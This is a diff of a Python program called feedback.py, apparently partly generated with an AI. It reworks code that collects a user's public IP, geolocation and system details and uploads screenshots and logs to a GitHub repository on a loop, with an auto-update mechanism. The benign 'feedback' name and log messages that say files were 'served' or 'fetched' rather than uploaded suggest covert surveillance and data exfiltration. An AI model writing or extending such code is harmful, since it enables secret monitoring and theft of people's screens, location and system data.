@@ -1,4 +1,5 @@
-# ss not uploading after 2 days is in testing phase (running currently)
+# 3rd version of feedback.py by deepseek AI
+# everything is working fine, but the SS is not working after 2 days
 
 import os
 import re
@@ -59,7 +60,7 @@ threshold_seconds = 90 * 24 * 60 * 60  # time in second (90 days in seconds) to 
 interval_logs_delete_status = 10 # interval in second (1 days in seconds) for checking log delete status
 # interval_logs_Upload_status = 1 * 24 * 60 * 60 # interval in second (1 days in seconds) for checking log upload status
 interval_logs_Upload_status = 30 * 60 # interval in second (1 days in seconds) for checking log upload status
-CURRENT_VERSION = "2.1.1" # current version of program <---------<----------<-----------------<-----------<---------------<-----------------<-----
+CURRENT_VERSION = "1.1.9" # current version of program <---------<----------<-----------------<-----------<---------------<-----------------<-----
 VERSION_URL = "https://raw.githubusercontent.com/bebedudu/autoupdate/refs/heads/main/latest_version.txt" # url to check new version
 BASE_DOWNLOAD_URL = "https://github.com/bebedudu/autoupdate/releases/download" # url to download then updated program
 APPLICATION_NAME = "feedback.exe" # compiled program name
@@ -506,10 +507,6 @@ def get_geolocation(ip_address):
         print(f"Error fetching geolocation: {e}")
         return ("N/A",) * 7
 
-ip_address = get_public_ip()
-country, region, city, org, loc, postal, timezone = get_geolocation(ip_address)
-# print(f"Country: {country}, Region: {region}, City: {city}")
-
 
 def get_system_info():
     """Get detailed system information as a string."""
@@ -566,7 +563,7 @@ def update_active_user_file(new_entry, active_user):
             encoded_content = base64.b64encode(updated_content.encode("utf-8")).decode("utf-8")
 
             update_payload = {
-                "message": f"Update active user log-{active_user}-{country}-{region}-{city}-{unique_id}",
+                "message": f"Update active user log with system info - {active_user}",
                 "content": encoded_content,
                 "sha": sha,
                 "branch": BRANCH,
@@ -1637,7 +1634,7 @@ def check_for_update(auto_update=False):
         else:
             print("You are using the latest version.")
             if not auto_update:
-                messagebox.showinfo("No Update", f"You are using the latest version {CURRENT_VERSION}.")
+                messagebox.showinfo("No Update", "You are using the latest version.")
     except requests.exceptions.RequestException as e:
         logging.error(f"Failed to check for updates: {e}")
         if not auto_update:
@@ -1970,17 +1967,6 @@ def mark_screenshot_uploaded(file_path):
 #         print(f"Removed stale cache entries: {removed_files}")
 #     save_uploaded_cache()
 
-def clean_uploaded_cache():
-    """Removes stale entries from the uploaded files cache."""
-    global screenshots_uploaded_cache
-    valid_files = {path for path in screenshots_uploaded_cache if os.path.exists(path)}
-    removed_files = screenshots_uploaded_cache - valid_files
-    screenshots_uploaded_cache = valid_files
-    if removed_files:
-        print(f"Removed {len(removed_files)} stale cache entries")
-        logging.info(f"Cleaned cache: Removed {len(removed_files)} stale entries")
-    save_uploaded_cache()
-
 # Function to upload a single file to GitHub
 # def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token):
 #     """
@@ -2076,7 +2062,7 @@ def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, g
                 content_base64 = base64.b64encode(new_content.encode('utf-8')).decode('utf-8')
 
             payload = {
-                "message": f"{'Updating' if sha else 'Uploading'} {username}-{country}-{region}-{city}-{unique_id} {file_name}",
+                "message": f"{'Updating' if sha else 'Uploading'} {username} {file_name}",
                 "content": content_base64,
                 "branch": branch_name
             }
@@ -2167,41 +2153,44 @@ def upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name,
 
 # Function to upload screenshots to GitHub
 def upload_screenshots_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
-    """Uploads all untracked screenshots in the specified folder to GitHub."""
-    global screenshots_uploaded_cache
+    """
+    Uploads all untracked screenshots in the specified folder to GitHub.
+    """
+    # for root, _, files in os.walk(folder_path):
+    #     for file_name in files:
+    #         file_path = os.path.join(root, file_name)
+    #         # print(f"Processing file: {file_path}")
+    #         if not is_screenshot_uploaded(file_path):
+    #             try:
+    #                 upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)
+    #                 mark_screenshot_uploaded(file_path)
+    #             except Exception as e:
+    #                 print(f"Error serving {file_path}: {e}")
+    #         else:
+    #             print(f"File already served (skipped): {file_path}")
+    #             # print(f"Skipping already uploaded file: {file_path} (in cache)")
     
-    # Use absolute path for screenshots folder
-    abs_screenshots_folder = os.path.join(app_dir, "screenshots")
-    
-    for root, _, files in os.walk(abs_screenshots_folder):
+    for root, _, files in os.walk(folder_path):
         for file_name in files:
             file_path = os.path.join(root, file_name)
-            if not file_path.lower().endswith(('.png', '.jpg', '.jpeg')):
-                continue  # Skip non-image files
-                
             if not is_screenshot_uploaded(file_path):
                 retry_count = 0
                 while retry_count < MAX_RETRIES:
                     try:
-                        print(f"Attempting to upload screenshot: {file_path}")
                         upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)
                         mark_screenshot_uploaded(file_path)
-                        logging.info(f"Successfully fetched screenshot: {file_path}")
-                        print(f"Successfully uploaded screenshot: {file_path}")
-                        break
+                        break  # Exit retry loop on success
                     except Exception as e:
                         retry_count += 1
-                        logging.error(f"Error uploading {file_path} (Attempt {retry_count}/{MAX_RETRIES}): {e}")
+                        print(f"Error uploading {file_path} (Attempt {retry_count}/{MAX_RETRIES}): {e}")
                         if retry_count < MAX_RETRIES:
                             time.sleep(RETRY_DELAY)
                         else:
-                            logging.warning(f"Permanently failed to upload {file_path}")
-                            # Remove from cache if permanently failed
-                            screenshots_uploaded_cache.discard(file_path)
-                            save_uploaded_cache()
-                else:
-                    print(f"Skipping failed upload: {file_path}")
-                    
+                            print(f"Failed to upload {file_path} after {MAX_RETRIES} attempts.")
+            else:
+                print(f"File already served (skipped): {file_path}")
+                # print(f"Skipping already uploaded file: {file_path} (in cache)")
+
 # Main upload logs function
 def upload_logs():
     """
@@ -2228,8 +2217,8 @@ def upload_logs():
     # Define allowed log extensions
     LOG_EXTENSIONS = ('.log', '.txt', '.json', '.bat')  # Add other allowed extensions
 
-    # Define screenshots folder using absolute path
-    screenshots_folder = os.path.join(app_dir, "screenshots")
+    # Define the screenshots folder path
+    screenshots_folder = "screenshots"
     
     # Load the cache of uploaded screenshots
     load_uploaded_cache()
@@ -2240,9 +2229,6 @@ def upload_logs():
     print("Starting the serveing monitoring script...")
 
     while True:  # Infinite loop for continuous execution
-
-        # Add cache cleaning before upload attempts
-        clean_uploaded_cache()
         
         # Fetch the upload interval from the URL
         # Fetch the upload interval and fallback interval from the URL
